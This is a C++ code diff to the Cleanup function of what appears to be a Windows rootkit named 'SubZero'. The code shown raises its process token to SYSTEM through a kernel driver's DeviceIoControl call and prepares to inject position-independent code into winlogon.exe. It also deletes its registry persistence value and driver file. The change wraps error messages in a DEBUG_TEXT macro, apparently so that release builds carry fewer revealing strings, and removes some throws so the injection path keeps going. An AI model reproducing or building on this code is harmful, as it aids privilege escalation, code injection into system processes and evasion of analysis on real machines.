@@ -39,7 +39,7 @@ void SubZeroCleanup::Cleanup()
                     0,
                     nullptr));
                 if (INVALID_HANDLE_VALUE == deviceAutoHandle.get())
-                    throw std::runtime_error("[-] Failed to open the device handle");
+                    finalException << DEBUG_TEXT("[-] Failed to open the device handle");
 
                 SubZeroSetTokenToSystemData pid = ::GetCurrentProcessId();
 
@@ -52,7 +52,7 @@ void SubZeroCleanup::Cleanup()
                     &bytesReturned,                  			// # bytes returned
                     nullptr))
                 {
-                    throw std::runtime_error("[-] DeviceIoControl Failed");
+                    finalException << DEBUG_TEXT("[-] DeviceIoControl Failed");
                 }
 
             	// Current process now will bw able to inject the PIC to winlogon.exe
@@ -61,7 +61,7 @@ void SubZeroCleanup::Cleanup()
         }
         catch (std::exception& exception)
         {
-            finalException << exception.what() << "\n";        
+            finalException << DEBUG_TEXT(exception.what() << "\n");
         }
 
         // Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
@@ -74,7 +74,7 @@ void SubZeroCleanup::Cleanup()
         RegistryManager::DeleteRegistryValue(autoRegKey.get(), REG_VALUE_NAME);
     }
     catch (const Win32ErrorCodeException& exception) {
-        finalException << exception.what() << "\n";
+        finalException << DEBUG_TEXT(exception.what() << "\n");
     }
 
     // Delete driver file
@@ -82,7 +82,7 @@ void SubZeroCleanup::Cleanup()
     {
         const int lastError = ::GetLastError();
         if (ERROR_FILE_NOT_FOUND != lastError)
-            finalException << "[-] Error deleting driver file. Error code: " << lastError << "\n";
+            finalException << DEBUG_TEXT("[-] Error deleting driver file. Error code: " << lastError << "\n");
     }
 	
 	// If there was an error elevating explorer to SYSTEM
@@ -108,8 +108,7 @@ void SubZeroCleanup::Cleanup()
 		    &si,                                        // STARTUPINFO pointer
 		    &pi))                                       // PROCESS_INFORMATION pointer             
 		{
-			finalException << "[-] Error finding target PIC injection process\n";
-            throw std::runtime_error(finalException.str());
+			finalException << DEBUG_TEXT("[-] Error finding target PIC injection process\n");
 		}
 
         ::CloseHandle(pi.hProcess);
@@ -127,7 +126,7 @@ void SubZeroCleanup::Cleanup()
     };
 
     if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
-        finalException << "[-] Invalid PIC parameters\n";
+        finalException << DEBUG_TEXT("[-] Invalid PIC parameters\n");
 	
     else 
     {
@@ -138,7 +137,7 @@ void SubZeroCleanup::Cleanup()
         }
         catch (std::exception& exception)
         {
-            finalException << exception.what() << "\n";
+            finalException << DEBUG_TEXT(exception.what() << "\n");
         }
     }
 
@@ -158,7 +157,7 @@ std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& pro
             return process.th32ProcessID;
     }
 
-    throw std::runtime_error("Could not find target process PID");
+    throw std::runtime_error(DEBUG_TEXT("Could not find target process PID"));
 }
 
 bool SubZeroCleanup::IsLocalSystem()
